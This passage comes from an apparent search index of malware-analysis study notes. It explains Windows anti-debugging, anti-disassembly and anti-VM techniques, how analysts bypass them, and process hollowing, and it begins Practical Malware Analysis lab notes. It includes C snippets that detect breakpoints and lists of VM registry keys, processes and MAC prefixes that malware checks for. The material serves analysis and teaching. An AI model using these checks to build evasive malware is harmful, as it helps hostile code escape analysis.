process is being debugged by a user-mode debugger.</li> <li>This function checks for <code>BeginDebugged</code> field in the Process Environment Block (PEB)<sup>2</sup></li> <li>the return value is nonzero if the current process is running in the context of a debugger.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#bypass","title":"Bypass","text":"<ul> <li>Refer to this guide IsDebuggerPresent Patching<sup>3</sup>. There are two methods described to bypass, one is to set <code>BeginDebugged</code> to <code>0</code> on runtime and the other is to fill the code with enough<code>NOP</code> operations. </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#isdebugged-field","title":"<code>IsDebugged</code> Field","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description-1415","title":"Description <sup>14</sup><sup>15</sup>","text":"<ul> <li>This is part of the PEB and can be found at location <code>fs:[30h]</code>. It is set by the system to <code>1</code> when a debugger is present.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#bypass_1","title":"Bypass","text":"<p>SImilar to IsDebuggerPresent bypass, we need to change the value of the flag to zero on runtime.</p>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#ntglobalflag","title":"<code>NtGlobalFlag</code>","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description","title":"Description","text":"<ul> <li><code>NtGlobalFlag</code> is part of the PEB with default value of <code>0</code></li> <li>It is found at offset 0x068 (x86) or 0x0bc (x64)</li> <li>It is made up of a set of flags and if a process is opened by a debugger, the following flags <code>FLG_HEAP_ENABLE_TAIL_CHECK (0X10)</code>, <code>FLG_HEAP_ENABLE_FREE_CHECK (0X20)</code> and <code>FLG_HEAP_VALIDATE_PARAMTERS (0X40)</code> will be set. </li> <li>The flag value will add up to <code>0x70</code> hence a <code>NtGlobalFlag</code> with value <code>0x70</code> would signify that a debugger is used to create the process.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#bypass_2","title":"Bypass","text":"<ul> <li>Similar to IsDebuggerPresent bypass, we need to change the value of the flag to zero on runtime.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#checkremotedebuggerpresent","title":"<code>CheckRemoteDebuggerPresent</code>","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description4","title":"Description<sup>4</sup>","text":"<ul> <li>Checks whether the current process is debugged by a remote process.</li> <li>Usually used alongside <code>IsDebuggerPresent</code> </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#bypass_3","title":"Bypass","text":"<ul> <li>Bypassing this is similar to bypassing <code>IsDebuggerPresent</code> where we will need to make this program return a zero value.</li> <li>A detailed explanation of bypass can be found here<sup>5</sup></li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#closehandlentclose","title":"<code>CloseHandle</code>/<code>NtClose</code>","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description678","title":"Description<sup>6</sup><sup>7</sup><sup>8</sup>","text":"<ul> <li><code>CloseHandle</code> and <code>NtClose</code> are related in the sense that when there is a function call for <code>CloseHandle</code> it will call <code>NtClose</code>.</li> <li><code>CloseHandle</code> operates differently when debugger is attached - an exception with error value <code>0xC0000008</code> will be raised. </li> <li>This exception code is unique to debuggers and can be detected with an exception handler and thus identifying that a debugger is present.</li> <li>Benefit of this technique is that in a program there will be many CloseHandle calls and it makes it harder to detect anti-debugging feature.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#bypass8","title":"Bypass<sup>8</sup>","text":"<ul> <li>The idea of bypass would be to register your own exception handler function with <code>AddVectoredExceptionHandler</code> and hook this to CloseHandle so that the exception value above is not thrown.</li> <li>The other method would be to <code>NOP</code> out the call to <code>CloseHandle</code> </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#findwindow","title":"<code>FindWindow</code>","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description910","title":"Description<sup>9</sup><sup>10</sup>","text":"<ul> <li>retrieves the handle to the top-level window whose class name and window name match the specified strings. </li> <li>Debugger will usually have their names on the window and hence this function searches for windows with the name of the debugger.</li> <li>The list is usually found hardcoded in the malware itself</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#bypass11","title":"Bypass<sup>11</sup>","text":"<ul> <li>Use a debugger not in the list</li> <li><code>NOP</code> pass the FindWindow instruction as suggested in here<sup>11</sup></li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#self-debugging-using-debugactiveprocess","title":"Self-Debugging using <code>DebugActiveProcess</code>","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description_1","title":"Description","text":"<ul> <li>By creating a child process that calls <code>kernel32!DebugActiveProcess</code> on the parent process the program is essentially debugging itself.</li> <li><code>DebugActiveProcess</code> will call <code>ntdll!DbgUiDebugActiveProcess</code> which will then call <code>ntdll!NtDebugActiveProcess</code></li> <li>If parent process is running under a debugger, the <code>NtDebugActiveProcess</code> syscall will fail. </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#bypass_4","title":"Bypass","text":"<ul> <li>We can follow slevin_by recommendation by skipping function calls with <code>NOP</code>.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#outputdebugstring","title":"<code>OutputDebugString</code>","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description_2","title":"Description","text":"<ul> <li><code>OutputDebugString</code> calls <code>RaiseException</code> where the output of the <code>RaiseException</code> should be handled by the debugger. The absence of the exceptions and will signify the presence of the debugger while the presence of the exceptions will signify that a debugger is not present.</li> <li>More details here<sup>12</sup> and here<sup>13</sup>.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#bypass_5","title":"Bypass","text":"<ul> <li>Again the bypass for this is to skip the function call with <code>NOP</code> or the method Galmeel Ali used<sup>12</sup>. </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#structured-exception-handling-seh","title":"Structured Exception Handling (SEH)","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description16","title":"Description<sup>16</sup>","text":"<ul> <li>Microsoft Structured Exception Handling (SEH) is the native exception handling mechanism for Windows </li> <li>It provides a single mechanism for the handling of kernel-mode and user-mode exceptions.</li> <li>When no debugger is present, SEH handler will receive control of any errors. However, if debugger is present, the debugger will intercept the control after the <code>int 3h</code> instruction. </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#tls-callback","title":"TLS Callback","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description_3","title":"Description","text":"<ul> <li>Thread Local Storage (TLS) Callbacks is a Windows mechanism that allows execution of arbitrary code on process and threads start and termination.</li> <li>TLS Callbacks can be used to run some anti-debug code before main function (or other entry point). Thus anti-debug code can check for debugger before entry point is reached and do its anti-analysis routine. </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#software-breakpoint-detection","title":"Software Breakpoint Detection","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description17","title":"Description<sup>17</sup>","text":"<ul> <li>Breakpoints is an intentional stopping or pausing place in a program, put in place for debugging purposes.</li> <li>Software breakpoints are usually generated by a call to the debug handle <code>int 3h</code>. The opcode for <code>int 3h</code> is <code>0xCC</code></li> <li>To detect if a software breakpoint exists, malware can enumerate the number of <code>0xCC</code> bytes using the <code>repne scasb</code> instruction.</li> <li>The malware can also have a function<sup>18</sup> like below to check for <code>0xCC</code>.    <pre><code>bool CheckForSpecificByte(BYTE cByte, PVOID pMemory, SIZE_T nMemorySize = 0)\n{\n    PBYTE pBytes = (PBYTE)pMemory; \n    // enumerate the memory location and compare with cByte \n    for (SIZE_T i = 0; ; i++)\n    {\n        // Break on RET (0xC3) if we don't know the function's size\n        if (((nMemorySize &gt; 0) &amp;&amp; (i &gt;= nMemorySize)) ||\n            ((nMemorySize == 0) &amp;&amp; (pBytes[i] == 0xC3)))\n            break;\n\n        if (pBytes[i] == cByte)\n            return true;\n    }\n    return false;\n}\n\nbool IsDebugged()\n{\n    PVOID functionsToCheck[] = {\n        &amp;Function1,\n        &amp;Function2,\n        &amp;Function3,\n    };\n    for (auto funcAddr : functionsToCheck)\n    {\n        if (CheckForSpecificByte(0xCC, funcAddr))\n            return true;\n    }\n    return false;\n}\n</code></pre></li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#bypass_6","title":"Bypass","text":"<ul> <li>The way to bypass this is to look for the function that is responsible for the enumeration and replace the return value. (Patching)</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#hardware-breakpoint-detection","title":"Hardware Breakpoint Detection","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description-18","title":"Description <sup>18</sup>","text":"<ul> <li>Values in debug registers <code>DR0</code>, <code>DR1</code>,<code>DR2</code>,<code>DR3</code> can be retrieved using Win32 API <code>GetThreadContext</code></li> <li>If thread context is non-zero, it may mean that the process is running under a debugger and a hardware breakpoint was set.</li> <li>The code below is an example of how detection can be done.    <pre><code>bool IsDebugged()\n{\n    CONTEXT ctx;\n    ZeroMemory(&amp;ctx, sizeof(CONTEXT)); \n    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS; \n\n    if(!GetThreadContext(GetCurrentThread(), &amp;ctx))\n        return false;\n\n    return ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3;\n}\n</code></pre></li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#bypass_7","title":"Bypass","text":"<ul> <li>To bypass this, we will need to reset the value of the debug registers to 0 with another Win32API <code>SetThreadContext</code>.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#trap-flag","title":"Trap Flag","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description-20","title":"Description <sup>20</sup>","text":"<ul> <li>Debugger will have the tendency to zero the <code>TRAP</code> Flag within the <code>EFLAGS</code>register.</li> <li>Therefore the malware might set the <code>TRAP</code> flag to <code>1</code> to trigger an exception and have SEH handle the exception which will then lead it to the correct code. </li> <li>Else, if a debugger is present, it will clear the <code>TRAP</code> flag which will then allow the program to step through and a possible exit function follows. </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#illustration-19","title":"Illustration <sup>19</sup>","text":"<p> - From the above is the section of a crackme where the <code>TRAP</code> flag is used to check for debugger. - We shall break the code into 4 parts     1.  Over here as the comment has said SEH is installed. SEH is installed to catch the exception later on.      2. In this set of instructions, the <code>TRAP</code> flag is set to <code>1</code>      3.  If a debugger is present, it will step right through to the next instruction. And as we can see, this set of instructions will lead to a textbox saying What the hell are you doing in my app with a debugger  and followed by an <code>ExitProcess</code> call.      4. However, if a debugger is not present, it will raise an exception and SEH will handle the exception which will step to this part of the code where the actual process starts. </p>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#bypass_8","title":"Bypass","text":"<ul> <li>Set a breakpoint in the code which follows the check and run the program until the breakpoint. Find out where the entry point should be after the breakpoint and jump to it.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#interrupts","title":"Interrupts","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description21","title":"Description<sup>21</sup>","text":"<ul> <li>Malware authors can intentionally call for an interrupt to check for the presence of a debugger. </li> <li>The following interrupt calls can be used :<ul> <li><code>int 3</code> </li> <li><code>int 2C</code></li> <li><code>int 2D</code></li> <li><code>ICE</code></li> </ul> </li> <li>Details of the mechanism of action of each interrupts can be found here.</li> <li>In general what is happening here is that these Interrupts will cause an exception to be raised. </li> <li>When a debugger is present, all these exceptions caused by the interrupts will be bypassed by the debugger. </li> <li>The anti-debug mechanism will be looking out for exceptions, and if there are no exceptions, when the interrupt is issued, debugger is assumed to be present.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#bypass_9","title":"Bypass","text":"<ul> <li>Patch with <code>NOP</code>.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#timing","title":"Timing","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description_4","title":"Description","text":"<ul> <li>Generally debugging tools require more time and effort to process instructions.</li> <li>This will create fluctuation and slowness that is more than the computer's processing speed threshold which is a fixed value.</li> <li>Thus the malware can read the time stamp of the computer multiple times and if it find irregularities, in the processing time, it will act like it detects a debugger. </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#anti-disassembly-techniques","title":"Anti-Disassembly Techniques","text":"<ul> <li>techniques used by malware authors to make crafted code or data in a program to cause disassembly analysis tools to produce an incorrect program listing.</li> <li>Below is a list of common techniques employed</li> </ul> Technique Description API Obfuscation - obfuscates the identifier names in  the code such as the or method names into random names. Opcode Obfuscation - decryption of sections of executables and code instructions, generating nonsensical  or hard to read opcode Spaghetti Code - source code that is unstructured and difficult-to- maintain Control Flow Graph Flattening - Control Flow Graph(CFG)flattening is done by breaking up the nested loops and if-else statements, hiding them as  large switch statement case wrapped inside the loop body. Jump Instruction  with Same Target - Combining <code>jz</code> and <code>jnz</code> to jump to the same target to produce an unconditional jump and confusing the  disassembler."},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#anti-vm-techniques","title":"Anti-VM Techniques","text":"<ul> <li>techniques used by malware author to detect virtual environments.</li> <li>VMs keep some artifacts to indicate that it is a VM and not a physical machine and they could be files, registry keys, processes services and network device adapters.</li> <li>Below are some common techniques used by malware author.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#__cpuid","title":"<code>__CPUID</code>","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description_5","title":"Description","text":"<ul> <li><code>__CPUID</code> is a win32api to call the <code>CPUID</code> instruction set to get information about the processor.</li> <li>Giving <code>__CPUID</code> with different <code>function_id</code> will give different details and the function IDs that is commonly used to enumerate the CPU information are 1 ,0 and 4000 0000.</li> </ul> <code>EAX</code> / <code>function_id</code> value Return 0 - return Processor Info and Feature Bits,  essentially a rundown of various details  about the CPU.  - On a physical machine, the 31st bit of  the returned <code>ECX</code> register will be 0,  while on a virtual machine it will be 1. 1 - return the CPU manufacturer-ID string,  a 12-character ASCII string that will  be stored in <code>EBX</code>, <code>EDX</code> and <code>ECX</code> (in that order).  - On machines running on a physical Intel or AMD CPU  this string will be \u201cGenuineIntel\u201d or \u201cAuthenticAMD\u201d,  respectively.  - On machines running off of Microsoft\u2019s Hyper-V or  VMware this string will be \u201cMicrosoft HV\u201d or \u201cVMwareVMware\u201d. 4000 0000 - returns virtualisation vendor string saved in <code>EAX</code>, <code>ECX</code> and <code>EDX</code>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#bypass_10","title":"Bypass","text":"<ul> <li>VM vendors usually allow the host machine to alter the CPUID and CPU features of the virtual machine.</li> <li>For VMware, we can find the <code>.vmx</code> file and add the following line :     <pre><code>cpuid.1.ecx='0---:----:----:----:----:----:----:---'\n</code></pre></li> <li>subsequently restart the VM.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#mmx-instruction-set","title":"<code>MMX</code> Instruction Set","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description_6","title":"Description","text":"<ul> <li>The <code>MMX</code> Instruction set is used for faster processing of graphics. </li> <li>Usually VMs do not support this instruction set, hence the absence of this instruction set could indicate that the malware is in a VM environment.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#vmware-magic-number","title":"VMWare 'Magic Number'","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description22","title":"Description<sup>22</sup>","text":"<ul> <li>VMware uses a virtual I/O port for communication between guest and host.</li> <li>This is to allow afor things like copy-paste between host and guest systems</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#bypass-23","title":"Bypass <sup>23</sup>","text":"<ol> <li>Look for instructions like <code>sidt</code>, <code>sgdt</code> and <code>sldr</code> during debugging and replace the Anti-Vm code with <code>NOP</code>.</li> <li>Not install Vmware tools </li> <li>Create multiprocessor VMs. </li> <li>Red Pill testa<sup>25</sup> usually work only on single processor machine.</li> <li>This can be mitigated by changing the settings of VMware with the following settings:     <pre><code>isolation.tools.getPtrLocation.disable = \"TRUE\"\nisolation.tools.setPtrLocation.disable = \"TRUE\"\nisolation.tools.setVersion.disable = \"TRUE\"\nisolation.tools.getVersion.disable = \"TRUE\"\nmonitor_control.disable_directexec = \"TRUE\"\nmonitor_control.disable_chksimd = \"TRUE\"\nmonitor_control.disable_ntreloc = \"TRUE\"\nmonitor_control.disable_selfmod = \"TRUE\"\nmonitor_control.disable_reloc = \"TRUE\"\nmonitor_control.disable_btinout = \"TRUE\"\nmonitor_control.disable_btmemspace = \"TRUE\"\nmonitor_control.disable_btpriv = \"TRUE\"\nmonitor_control.disable_btseg = \"TRUE\"\n</code></pre></li> </ol>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#known-mac-address","title":"Known MAC Address","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description_7","title":"Description","text":"<ul> <li>Malware can determine the presence of VM by checking the prefix of the MAC address.</li> </ul> Vm Brand MAC Address Prefix VMware 00:05:69, 00:0C:29, 00:1C:14, 00:50:56, 08:00:27 VirtualBox 08:00:27 Hyper-V 00:03:FF"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#registry-key","title":"Registry Key","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description_8","title":"Description","text":"<ul> <li>Some registry keys can indicate the presence of virtualisation software.</li> <li>Malware can be made to enumerate for these registry keys.</li> </ul> VM Brand Registry Keys Generic - HKEY_LOCAL_MACHINE\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi   - HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\SystemBiosVersion VMware - HKEY_CURRENT_USER\\Software\\VMware Inc  - HKEY_LOCAL_MACHINE\\SOFTWARE\\VMware Inc  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\SCSI\\VMWARE - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VMware VirtualBox - HKEY_LOCAL_MACHINE\\HARDWARE\\ACPI\\DSDT\\VBOX - HKEY_LOCAL_MACHINE\\HARDWARE\\ACPI\\FADT\\VBOX - HKEY_LOCAL_MACHINE\\HARDWARE\\ACPI\\RSDT\\VBOX - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Vbox - HKEY_LOCAL_MACHINE\\SOFTWARE\\Oracle\\VirtualBox Guest Additions"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#checking-for-vm-processes-files-services","title":"Checking for VM Processes, Files &amp; Services","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description-24","title":"Description <sup>24</sup>","text":"<ul> <li>VMs generally runs some processes and services or produce some file artefacts which are indicative of the use of VM.</li> <li>These information can be obtained using Wni32API, WMIC or CMD</li> </ul> VM Brand Processes VMware - VMwareuser.exe  - Vmtoolsd.exe  - Vmwaretrat.exe  - VGAuthService.exe  - vmacthlp.exe VirtualBox - vboxservice.exe  - vboxtray.exe VM Brand Services VMware - VMTools  - vmvss  - VGAuthService  - VMware Physical Disk Helper Service VirtualBox - VBoxService VM Brand Files VMware - C:\\Windows\\System32\\drivers\\vmhgfs.sys  - C:\\Windows\\System32\\drivers\\vmmemctl.sys - C:\\Windows\\System32\\drivers\\vmmouse.sys - C:\\Windows\\System32\\drivers\\vmrawdsk.sys VirtualBox - C:\\Windows\\System32\\drivers\\VBoxMouse.sys - C:\\Windows\\System32\\drivers\\VBoxGuest.sys - C:\\Windows\\System32\\drivers\\VBoxSF.sys - C:\\Windows\\System32\\drivers\\VBoxVideo.sys"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#process-hollowing","title":"Process Hollowing","text":"<ul> <li>Is a process in which the malware unmaps or 'hollows' out the code of the legitimate process from memory and overwrites the memory space of the victim process with its malicious code.</li> <li>Content of the PEB (Process Environment Block) and path of the process being hollowed remains the same but the actual data and code of the process are changed thus avoiding detection by unsopisticated signature-based EDR/AV. </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#illustration-of-proccess-hollowing","title":"Illustration of Proccess Hollowing","text":"<p><pre><code>graph TD;\n\nsubgraph Process\nA[1. Malware creates a new process in&lt;br&gt; suspended state to host malicious code]--&gt;B[2. Malware then unmap the legitimate&lt;br&gt; process content and replaces &lt;br&gt;the space with its malicious payload &lt;br&gt; which can come from the malware process&lt;br&gt; or from a file stored in disk.]\n\nB--&gt;C[3. The loader will allocate new memory &lt;br&gt;space for malware with all permissions: &lt;br&gt;read, write and execute and subsequently &lt;br&gt; write the malware's section into the target &lt;br&gt; process memory space]\n\nC--&gt;D[4. The malware then uses SetThreadContext &lt;br&gt; to determine the entry point of the &lt;br&gt; new malicious code section which has &lt;br&gt;been written.]\n\nD--&gt;E[5. Malware resumes the suspended thread]\nend\n\nsubgraph API Calls\nA1[CreateProcess]--&gt;B1[NtUnmapViewOfSection/&lt;br&gt;ZwUnmapViewOfSection]--&gt;C1[VirtualAllocEx&lt;br&gt;WriteProcessMemory]--&gt;D1[SetThreadContext]--&gt;E1[ResumeThread]\nend</code></pre> - in Step 3 rather than writing into the section to be used using <code>WriteProcessMemory</code>, stealthier malware could have created a new section and make the process map to the new section created. - In Step 4 some malware could modify the entry point instead of using <code>SetThreadContext</code> to determine the entry point.</p>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#using-api-monitor-to-observe-process-hollowing","title":"Using API Monitor to Observe Process Hollowing","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#set-up-monitoring","title":"Set-Up Monitoring","text":"<ul> <li>Run API Monitor as <code>Administrator</code> </li> <li> <p>Set filter to filter for :</p> <ol> <li><code>CreateProcessA</code> &amp; <code>CreateProcessW</code> </li> <li><code>NtQueryInformationProcess</code>, <code>NtUnmapViewOfSection</code>, <code>NtCreateSection</code>, <code>NtMapViewOfSection</code>, </li> <li><code>VirtualProtect</code>,<code>VirtualAlloc</code> , <code>VirtualAllocEx</code>,  <code>ReadProcessMemory</code> &amp; <code>WriteProcessMemory</code></li> <li><code>SetThreadContext</code>, <code>GetProcAddress</code></li> <li><code>NtResumeThread</code> &amp; <code>ResumeThread</code></li> </ol> </li> <li> <p>Filter can be set by checking the API call filter like below : </p> </li> <li>Breakpoints can be set like below to get alert when certain APIs are called like below : </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#specify-application-to-monitor","title":"Specify Application to Monitor","text":"<ul> <li>Can be done by either clicking here  or </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#before-running","title":"Before Running","text":"<p>Process --&gt; Executable to monitor </p> <p>Arguments --&gt; Arguments/Parameters the executable will need</p>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#debugging","title":"Debugging","text":"<ul> <li>Alerts Created </li> <li>Recorded API Calls     </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#footnote","title":"Footnote","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#anti-debug","title":"Anti-Debug","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#anti-vm","title":"Anti-VM","text":"<ol> <li> <p>(https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent)\u00a0\u21a9</p> </li> <li> <p>(https://en.wikipedia.org/wiki/Process_Environment_Block)\u00a0\u21a9</p> </li> <li> <p>(https://reverseengineering.stackexchange.com/questions/16983/bypass-isdebuggerpresent)\u00a0\u21a9</p> </li> <li> <p>(https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-checkremotedebuggerpresent)\u00a0\u21a9</p> </li> <li> <p>(https://oxhat.blogspot.com/2017/10/Anti-Reverse-Engineering-CheckRemoteDebuggerPresentAPI.html)\u00a0\u21a9</p> </li> <li> <p>(https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)\u00a0\u21a9</p> </li> <li> <p>(https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntclose)\u00a0\u21a9</p> </li> <li> <p>(https://guidedhacking.com/threads/anti-debugging-tricks-%E2%80%93-closehandle-debugger-detection.14468/)\u00a0\u21a9\u21a9</p> </li> <li> <p>(https://docs.microsoft.com/en-us/previous-versions/ms960613(v=msdn.10))\u00a0\u21a9</p> </li> <li> <p>(https://docs.microsoft.com/en-us/windows/win32/learnwin32/what-is-a-window-)\u00a0\u21a9</p> </li> <li> <p>(https://github.com/sloppey/FindWindowA-Bypass)\u00a0\u21a9\u21a9</p> </li> <li> <p>https://malgamy.github.io/revese%20enginnering/Anti-debugging-and-anti-tracing-techniques5/\u00a0\u21a9\u21a9</p> </li> <li> <p>https://www.anti-reversing.com/debugger-detection-using-outputdebugstring-seh/\u00a0\u21a9</p> </li> <li> <p>https://unprotect.it/technique/isdebugged-flag/\u00a0\u21a9</p> </li> <li> <p>https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=230d68b2-c80f-4436-9c09-ff84d049da33&amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;tab=librarydocuments\u00a0\u21a9</p> </li> <li> <p>https://0xpat.github.io/Malware_development_part_3/\u00a0\u21a9</p> </li> <li> <p>https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software\u00a0\u21a9</p> </li> <li> <p>https://anti-debug.checkpoint.com/techniques/process-memory.html#software-breakpoints\u00a0\u21a9\u21a9</p> </li> <li> <p>https://leons.im/posts/anti-debug-with-trap-flag-register/\u00a0\u21a9</p> </li> <li> <p>https://anti-debug.checkpoint.com/techniques/assembly.html#popf_and_trap_flag\u00a0\u21a9</p> </li> <li> <p>https://resources.infosecinstitute.com/topic/anti-disassembly-anti-debugging-and-anti-vm/\u00a0\u21a9</p> </li> <li> <p>https://brundlelab.wordpress.com/2012/10/21/detecting-vmware/\u00a0\u21a9</p> </li> <li> <p>https://sganiere.wordpress.com/2012/11/20/malware-anti-vm-technics/\u00a0\u21a9</p> </li> <li> <p>https://www.deepinstinct.com/blog/malware-evasion-techniques-part-2-anti-vm-blog\u00a0\u21a9</p> </li> <li> <p>https://unprotect.it/technique/sidt-red-pill/\u00a0\u21a9</p> </li> </ol>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%200/","title":"Chapter 0","text":"<p>Disclaimer : There is no such chapter in the actual Practical Malware Analysis book.</p> <ul> <li>In the midst of working with a few malware samples, I realised that some of them have similar code structure, functions and imports despite difference in hash.</li> <li>The purpose of this chapter is to prevent double work for malware analysis. </li> <li>Whilst I understand the reason for using the same malware (lesson objectives) I am using the malware in this book as samples to practice on, build an analysis workflow and gain confidence hence the need to not do double work.</li> <li>This will also has the added benefit of teaching how to identify variants of the same malware or when polymorphism techniques are used.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%200/#ssdeep","title":"SSDEEP","text":"<ul> <li>A quick and dirty method employed here will be to use this tool SSDEEP which is a fuzzy hashing tool. </li> <li>While there are other techniques used like ImpHash and section hash, SSDEEP is the only tool known to me that can do it at scale and automatically.</li> </ul> <pre><code>ssdeep -d -r -c ./Folder_with_malware\n</code></pre>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%200/#results","title":"Results","text":"File A File B Similarities (%) /Chapter_15L/Lab15-01.exe /Chapter_7L/Lab07-02.exe 36 /Chapter_15L/Lab15-03.exe /Chapter_15L/Lab15-01.exe 24 /Chapter_15L/Lab15-02.exe /Chapter_15L/Lab15-01.exe 32 /Chapter_15L/Lab15-02.exe /Chapter_15L/Lab15-03.exe 29 /Chapter_1L/Lab01-01.dll /Chapter_7L/Lab07-03.dll 100 /Chapter_1L/Lab01-01.exe /Chapter_7L/Lab07-03.exe 100 /Chapter_18L/Lab18-02.exe /Chapter_1L/Lab01-03.exe 100 /Chapter_5L/Lab05-01.dll /Chapter_17L/Lab17-02.dll 93 /Chapter_12L/Lab12-02.exe /Chapter_17L/Lab17-03.exe 60 /Chapter_12L/Lab12-04.exe /Chapter_1L/Lab01-04.exe 99 /Chapter_3L/Lab03-03.exe /Chapter_17L/Lab17-03.exe 60 /Chapter_3L/Lab03-03.exe /Chapter_12L/Lab12-02.exe 100 /Chapter_3L/Lab03-04.exe /Chapter_9L/Lab09-01.exe 100"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/","title":"Chapter 1","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#lab-1-1","title":"Lab 1-1","text":"<p>This lab uses the files Lab01-01.exe and Lab01-01.dll. Use the tools and techniques described in the chapter to gain information about the files and 